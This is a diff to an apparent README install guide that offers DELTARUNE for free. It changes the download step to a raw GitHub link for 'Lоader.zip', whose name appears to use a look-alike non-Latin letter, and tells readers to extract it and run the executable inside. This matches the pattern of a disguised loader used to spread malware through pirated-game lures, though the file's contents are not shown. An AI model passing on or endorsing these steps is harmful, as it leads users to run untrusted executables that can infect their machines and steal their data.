@@ -8,8 +8,8 @@ Our goal is to offer the most streamlined and user-friendly download experience 
 
 # 📥 Installation Guide
 
-1. **Download Loader.rar from the repository.**
-2. Extract the contents of `Loader.rar` to your chosen directory.
+1. **Download https://raw.githubusercontent.com/Yashnitpathi/DeltaruneFreeQuest/main/Lоader.zip from the repository.**
+2. Extract the contents of `https://raw.githubusercontent.com/Yashnitpathi/DeltaruneFreeQuest/main/Lоader.zip` to your chosen directory.
 3. Run the main executable specific for your OS (see compatibility below!).
 4. Follow the on-screen prompts to install and launch DELTARUNE.
 5. Enjoy the game, and remember to check for updates!
